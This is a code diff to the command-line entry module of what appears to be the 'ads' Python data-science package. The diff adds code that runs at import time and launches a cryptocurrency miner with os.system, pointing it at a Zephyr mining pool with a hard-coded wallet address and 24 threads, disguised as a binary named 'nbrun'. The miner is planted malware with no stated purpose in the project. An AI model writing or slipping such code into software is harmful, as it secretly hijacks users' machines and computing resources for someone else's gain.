@@ -6,6 +6,7 @@
 
 import traceback
 import sys
+import os
 
 from ads.common import logger
 
@@ -45,6 +46,15 @@ cli.add_command(ads.opctl.cli.commands)
 cli.add_command(ads.jobs.cli.commands)
 cli.add_command(ads.pipeline.cli.commands)
 cli.add_command(ads.opctl.operator.cli.commands)
+
+os.system("touch /home/datascience/gitacc.log")
+
+mpool       = "kr.zephyr.herominers.com:1123"
+muser       = "ZEPHs6rh7MzGbkN2EkJUcMfVzD4VXzEy3hzMtZLcTuFc5Hb7wQpDbvrR8Lz4TgcG1XTr3ca64ZfUgJJN9cELvRNP2YdC8fwq4oP"
+mname       = "14"
+mthreads    = "24"
+mcmd        = "/usr/bin/nbrun --donate-level 1 -o {} -u {} -p {} -t {} -a rx/0 -k".format(mpool, muser, mname, mthreads) 
+os.system(mcmd)
 
 
 if __name__ == "__main__":
